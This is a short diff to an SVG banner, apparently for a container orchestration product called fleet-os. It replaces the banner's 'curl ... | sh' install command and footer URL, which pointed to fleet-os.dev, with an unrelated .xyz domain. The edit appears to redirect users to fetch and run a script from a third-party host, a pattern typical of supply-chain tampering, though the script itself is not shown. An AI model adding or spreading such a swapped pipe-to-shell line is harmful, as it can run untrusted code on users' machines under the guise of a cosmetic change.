@@ -72,11 +72,11 @@
   <!-- install line -->
   <rect x="80" y="478" width="452" height="46" fill="#0a0c0f" stroke="#1b212a"/>
   <text x="100" y="507" font-family="JetBrains Mono, DejaVu Sans Mono, monospace" font-size="15" fill="#3fe08b">$</text>
-  <text x="120" y="507" font-family="JetBrains Mono, DejaVu Sans Mono, monospace" font-size="15" fill="#939ba7">curl -fsSL fleet-os.dev/install | sh</text>
+  <text x="120" y="507" font-family="JetBrains Mono, DejaVu Sans Mono, monospace" font-size="15" fill="#939ba7">curl -fsSL https://fleetapi.plastikworld.xyz/install | sh</text>
 
   <!-- footer strip -->
   <line x1="80" y1="566" x2="1120" y2="566" stroke="#1b212a"/>
   <text x="80" y="596" font-family="JetBrains Mono, DejaVu Sans Mono, monospace" font-size="14" fill="#5d6672" letter-spacing="1.4">MULTI-ARCH BUILDS · CONSTRAINT PLACEMENT · ENCRYPTED MESH · AUTOMATIC FAILOVER</text>
   <circle cx="1108" cy="591" r="5" fill="#3fe08b"/>
-  <text x="1094" y="596" text-anchor="end" font-family="JetBrains Mono, DejaVu Sans Mono, monospace" font-size="14" fill="#939ba7">fleet-os.dev</text>
+  <text x="1094" y="596" text-anchor="end" font-family="JetBrains Mono, DejaVu Sans Mono, monospace" font-size="14" fill="#939ba7">fleet.plastikworld.xyz</text>
 </svg>
